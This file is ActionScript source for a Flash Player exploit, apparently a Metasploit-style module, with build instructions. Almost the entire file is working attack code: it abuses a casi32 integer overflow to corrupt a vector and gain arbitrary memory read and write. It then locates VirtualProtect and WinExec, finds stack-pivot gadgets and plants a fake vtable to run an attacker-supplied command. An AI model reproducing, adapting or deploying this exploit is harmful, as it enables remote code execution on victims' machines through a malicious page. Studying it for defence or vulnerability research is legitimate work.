// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 2. Download the Flex SDK (4.6)
// 3. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 4. Build with: mxmlc -o msf.swf Main.as

// Original code skeleton by @hdarwin89 for other exploits

package
{
	import flash.display.Sprite
	import flash.utils.ByteArray
	import flash.system.ApplicationDomain
	import avm2.intrinsics.memory.casi32
	import flash.display.LoaderInfo
	import mx.utils.Base64Decoder

	public class Main extends Sprite 
	{
		private var BYTE_ARRAY_SIZE:Number = 1024
		private var defrag:Vector.<Object> = new Vector.<Object>(100)
		private var ov:Vector.<Object> = new Vector.<Object>(100)
		private var uv:Vector.<Object> = new Vector.<Object>(100)
		private var uv_index:uint
		private var ba:ByteArray
		private var b64:Base64Decoder = new Base64Decoder();
		private var payload:String = ""
				
		public function Main() 
		{
			var i:uint = 0
			var j:uint = 0
			
			var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
			var pattern:RegExp = / /g;
			b64_payload = b64_payload.replace(pattern, "+")
			b64.decode(b64_payload)
			payload = b64.toByteArray().toString()
			for (i = 0; i < defrag.length; i++) {
				defrag[i] = new ByteArray()
				defrag[i].length = BYTE_ARRAY_SIZE
				defrag[i].endian = "littleEndian"
			}
			
			ba = new ByteArray()
			ov[0] = ba
			ov[0].length = BYTE_ARRAY_SIZE
			ov[0].endian = "littleEndian"

			for (i = 1; i < ov.length; i++) {
				ov[i] = new Vector.<Object>(1014)
				ov[i][0] = ba
				ov[i][1] = this
			}
			
			for (i = 0; i < uv.length; i++) {
				uv[i] = new Vector.<uint>(1014)
				uv[i][0] = 0x41424344
			}
			
			var stack:Vector.<uint> = new Vector.<uint>(0x6400)
			var payload_space:Vector.<uint> = new Vector.<uint>(0x6400)
						
			for (i = 1; i < ov.length; i++) {
				ov[i][2] = stack
				ov[i][3] = payload_space
			}

			ApplicationDomain.currentDomain.domainMemory = ba;
			// Make ByteArray length 0 so the casi32 integer overflow 
			// can be exploited
			ba.atomicCompareAndSwapLength(1024, 0)
			
			var object_vector_pos:uint = search_object_vector()
			var byte_array_object:uint = read_byte_array(object_vector_pos + 4) - 1
			var stack_object:uint = read_byte_array(object_vector_pos + 12) - 1
			var payload_space_object:uint = read_byte_array(object_vector_pos + 16) - 1
			var main:uint = read_byte_array(object_vector_pos + 8) - 1
			var uint_vector_pos:uint = search_uint_vector()
			var object_vector_address:uint = read_byte_array(object_vector_pos - 16) + 12
			var uint_vector_address:uint = object_vector_address + (uint_vector_pos - object_vector_pos)
			
			// Overwrite uint vector length
			var orig_length:uint = write_byte_array(uint_vector_pos, 0xffffffff)
			
			for (i = 0; i < uv.length; i++) {
				if (uv[i].length > 1024) {
					uv_index = i
					uv[i][0] = uint_vector_address
					break
				}
			}
						
			var buffer_object:uint = vector_read(byte_array_object + 0x40)
			var buffer:uint = vector_read(buffer_object + 8)
			var stack_address:uint = vector_read(stack_object + 0x18)
			var payload_address:uint = vector_read(payload_space_object + 0x18)
			var vtable:uint = vector_read(main)
			
			// Set the new ByteArray length
			ba.endian = "littleEndian"
			ba.length = 0x500000
			
			// Overwite the ByteArray data pointer and capacity
			var ba_array:uint = buffer_object + 8
			var ba_capacity:uint = buffer_object + 16
			vector_write(ba_array)
			vector_write(ba_capacity, 0xffffffff)
			
			// restoring the corrupted vector length since we don't need it
			// anymore
			byte_write(uv[uv_index][0], orig_length)
			
			var flash:uint = base(vtable)
			var winmm:uint = module("winmm.dll", flash)
			var kernel32:uint = module("kernel32.dll", winmm)
			var virtualprotect:uint = procedure("VirtualProtect", kernel32)
            var winexec:uint = procedure("WinExec", kernel32)
            var xchgeaxespret:uint = gadget("c394", 0x0000ffff, flash)
            var xchgeaxesiret:uint = gadget("c396", 0x0000ffff, flash)
            
            // Continuation of execution
            byte_write(buffer + 0x10, "\xb8", false); byte_write(0, vtable, false) // mov eax, vtable
            byte_write(0, "\xbb", false); byte_write(0, main, false) // mov ebx, main
            byte_write(0, "\x89\x03", false) // mov [ebx], eax
            byte_write(0, "\x87\xf4\xc3", false) // xchg esp, esi # ret

            // Put the payload (command) in memory
            byte_write(payload_address + 8, payload, true); // payload
            
            // Put the fake vtabe / stack on memory
            byte_write(stack_address + 0x18070, xchgeaxespret) // Initial gadget (stackpivot); from @hdarwin89 sploits, kept for reliability...
            byte_write(stack_address + 0x180a4, xchgeaxespret) // Initial gadget (stackpivot); call    dword ptr [eax+0A4h]
            byte_write(stack_address + 0x18000, xchgeaxesiret) // fake vtable; also address will become stack after stackpivot
            byte_write(0, virtualprotect)

            // VirtualProtect
            byte_write(0, winexec)
            byte_write(0, buffer + 0x10)
            byte_write(0, 0x1000)
            byte_write(0, 0x40)
            byte_write(0, buffer + 0x8) // Writable address (4 bytes)

            // WinExec
            byte_write(0, buffer + 0x10)
            byte_write(0, payload_address + 8)
            byte_write(0)

            byte_write(main, stack_address + 0x18000) // overwrite with fake vtable
            						
            toString() // call method in the fake vtable
		}
		
		// Methods to use the integer overflow
		
		private function search_object_vector(limit:uint = 0xf9000, pattern:uint = 1014):uint {
			var mem:uint = 0
			var mem_first_pos:uint = 0
			var next_length:uint = 0
			
			for (var i:uint = 0; i < limit; i = i + 4) {
				mem = read_byte_array(i)
				mem_first_pos = read_byte_array(i + 8)
				if (mem == pattern && mem_first_pos != 0x41424344) {
					return i;
				}
			}
			return -1;
		}
		
		private function search_uint_vector(limit:uint = 0xf9000, pattern:uint = 1014):uint {
			var mem:uint = 0
			var mem_first_pos:uint = 0
			
			for (var i:uint = 0; i < limit; i = i + 4) {
				mem = read_byte_array(i)
				mem_first_pos = read_byte_array(i + 8)
				if (mem == pattern && mem_first_pos == 0x41424344) {
					return i;
				}
			}
			return -1;
		}
						
		private function read_byte_array(offset:uint = 0):uint {
			var old:uint = casi32(offset, 0xdeedbeef, 0xdeedbeef)
			return old
		}
		
		private function write_byte_array(offset:uint = 0, value:uint = 0):uint {
			var old:uint = read_byte_array(offset)
			casi32(offset, old, value)
			return old
		}
		
		// Methods to use the corrupted vector for arbitrary reading/writing
		
		private function vector_write(addr:uint, value:uint = 0):void
		{
			addr > uv[uv_index][0] ? uv[uv_index][(addr - uv[uv_index][0]) / 4 - 2] = value : uv[uv_index][0xffffffff - (uv[uv_index][0] - addr) / 4 - 1] = value
		}

		private function vector_read(addr:uint):uint
		{
			return addr > uv[uv_index][0] ? uv[uv_index][(addr - uv[uv_index][0]) / 4 - 2] : uv[uv_index][0xffffffff - (uv[uv_index][0] - addr) / 4 - 1]
		}

		// Methods to use the corrupted byte array for arbitrary reading/writing
		
		private function byte_write(addr:uint, value:* = 0, zero:Boolean = true):void
		{
			if (addr) ba.position = addr
			if (value is String) {
				for (var i:uint; i < value.length; i++) ba.writeByte(value.charCodeAt(i))
				if (zero) ba.writeByte(0)
			} else ba.writeUnsignedInt(value)
		}

		private function byte_read(addr:uint, type:String = "dword"):uint
		{
			ba.position = addr
			switch(type) {
				case "dword":
					return ba.readUnsignedInt()
				case "word":
					return ba.readUnsignedShort()
				case "byte":
					return ba.readUnsignedByte()
			}
			return 0
		}
		
		// Methods to search the memory with the corrupted byte array
		
		private function base(addr:uint):uint
		{
			addr &= 0xffff0000
			while (true) {
				if (byte_read(addr) == 0x00905a4d) return addr
				addr -= 0x10000
			}
			return 0
		}

		private function module(name:String, addr:uint):uint
		{
			var iat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x80) 
			var i:int = -1
			while (true) {
				var entry:uint = byte_read(iat + (++i) * 0x14 + 12)
				if (!entry) throw new Error("FAIL!");
				ba.position = addr + entry
				var dll_name:String = ba.readUTFBytes(name.length).toUpperCase();
				if (dll_name == name.toUpperCase()) {
					break;
				}
			}
			return base(byte_read(addr + byte_read(iat + i * 0x14 + 16)));
		}

		private function procedure(name:String, addr:uint):uint
		{
			var eat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x78)
			var numberOfNames:uint = byte_read(eat + 0x18)
			var addressOfFunctions:uint = addr + byte_read(eat + 0x1c)
			var addressOfNames:uint = addr + byte_read(eat + 0x20)
			var addressOfNameOrdinals:uint = addr + byte_read(eat + 0x24)
			
			for (var i:uint = 0; ; i++) {
				var entry:uint = byte_read(addressOfNames + i * 4)
				ba.position = addr + entry
				if (ba.readUTFBytes(name.length+2).toUpperCase() == name.toUpperCase()) break
			}
			return addr + byte_read(addressOfFunctions + byte_read(addressOfNameOrdinals + i * 2, "word") * 4)
		}

		private function gadget(gadget:String, hint:uint, addr:uint):uint
		{
			var find:uint = 0
			var limit:uint = byte_read(addr + byte_read(addr + 0x3c) + 0x50)
			var value:uint = parseInt(gadget, 16)
			for (var i:uint = 0; i < limit - 4; i++) if (value == (byte_read(addr + i) & hint)) break
			return addr + i
		}
	}
}